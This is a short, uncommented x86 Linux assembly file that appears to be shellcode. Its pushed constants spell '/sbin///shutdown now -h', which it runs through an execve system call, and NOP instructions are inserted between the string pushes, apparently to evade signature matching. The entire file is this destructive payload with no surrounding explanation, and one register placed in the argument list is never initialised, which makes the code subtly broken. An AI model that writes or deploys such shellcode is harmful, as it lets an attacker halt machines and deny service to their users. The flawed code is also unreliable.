global _start

section .text

_start:

	xor    eax,eax
	mov    edx,eax
	push   edx
	push   word 0x682d
	mov    edi,esp
	push   edx
	push   0x6e
	mov    WORD [esp+0x1],0x776f
	mov    edi,esp
	push   edx
	NOP
	push   0x6e776f64
	NOP	
	push   0x74756873
	NOP	
	push   0x2f2f2f6e
	NOP	
	push   0x6962732f
	NOP	
	mov    ebx,esp
	push   eax
	push   esi
	push   edi
	push   ebx
	mov    ecx,esp
	mov    al,0xb
	int    0x80
